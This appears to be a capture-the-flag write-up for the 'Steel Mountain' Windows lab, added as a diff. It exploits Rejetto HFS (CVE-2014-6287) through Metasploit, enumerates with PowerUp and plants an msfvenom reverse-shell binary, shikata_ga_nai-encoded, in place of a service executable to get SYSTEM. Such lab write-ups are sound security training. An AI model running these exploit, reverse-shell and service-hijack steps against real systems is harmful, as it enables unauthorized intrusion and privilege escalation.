@@ -1,0 +1,34 @@
+--- Steel Mountain ---
+
+1. Check nmap > Ports 80, 135, 139, 445, 3389, and 8080 (Rejetto Http File Server) are open.
+2. Seeing the port 80 open, we can say it must be a website. Visiting the website, we get an image which states that the person is the
+   "Employee of the month". From the source page of the website, we find that this is the image of "Bill Harper".
+3. From nmap, we found that HFS 2.3 is running on port 8080. ExploitDB gives us the exploit CVE-2014-6287. Let's search for this exploit
+   on msfconsole and we got 1 entry which has excellent ranking. Using this exploit, we got a meterpreter shell. The user flag is
+   located in side the c:\Users\bill\Desktop directory.
+4. To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and
+   determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on
+   misconfigurations." Script link: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+   Upload the script using the "upload PowerUp.ps1" command inside meterpreter session. Load powershell inside the meterpreter session
+   and enter powershell by running the "powershell_shell" command.
+5. Run the script using the following commands.
+   > . .\PowerUp.ps1
+   > Invoke-AllChecks
+   Service AdvancedSystemCareService9 has CanRestart option set to true, which allows us to restart a service on the system. It has
+   Unquoted Service Paths vulnerability. The executable file name is ASCService.exe and it is writable.
+6. Let's use msfvenom to generate a reverse shell as an Windows executable.
+   > msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+   Now in a new msfconsole, use the Multi Handler to receive the incoming connection. Now, in the previous meterpreter session, to
+   upload the binary and replace the legitimate one, follow the below process.
+   > shell
+   > sc stop AdvancedSystemCareService9
+   > Ctrl + C
+   > upload ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+   > shell
+   > sc start AdvancedSystemCareService9
+   > Ctrl + C
+   > migrate [pid]
+7. Now, we have got a stable root privilege. The root flag is located in side the c:\Users\Administrator\Desktop directory.
+
+--- Enjoy ---
+
